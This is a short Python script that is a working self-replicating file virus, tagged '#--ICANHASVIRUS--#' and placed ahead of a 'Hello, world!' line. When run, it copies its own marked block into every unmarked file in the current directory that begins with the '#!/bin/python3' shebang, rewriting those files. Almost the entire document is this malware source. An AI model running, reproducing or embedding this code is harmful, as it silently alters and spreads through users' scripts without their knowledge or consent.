#!/bin/python3
#--ICANHASVIRUS--#

import sys
import os

def infect(file_name,virus,virus_marker):
    with open(file_name,"r+") as fd:
        start = fd.readline(15);
        if start != "#!/bin/python3\n":
            return
        marker = fd.readline()
        if marker.rstrip() == virus_marker:
            return
    with open(file_name,"r+") as fd:
        contents = fd.readlines()
        contents[1:1] = virus
    with open(file_name, "w") as fd:
        print(contents)
        contents = "".join(contents)
        fd.write(contents)

def virus():
    virus_marker = "#--ICANHASVIRUS--#"
    filename = sys.argv[0]
    virus_code = []
    with open(filename,"r") as fd:
        virus_pos = 0
        for ln in fd.readlines():
            if ln.rstrip() == virus_marker:
                virus_pos = virus_pos + 1
            if virus_pos == 1:
                virus_code.append(ln)
        virus_code.append(virus_marker + "\n")
        files = os.listdir(".")
        for i in files:
            infect(i,virus_code,virus_marker)

virus()

#--ICANHASVIRUS--#

print("Hello, world!")
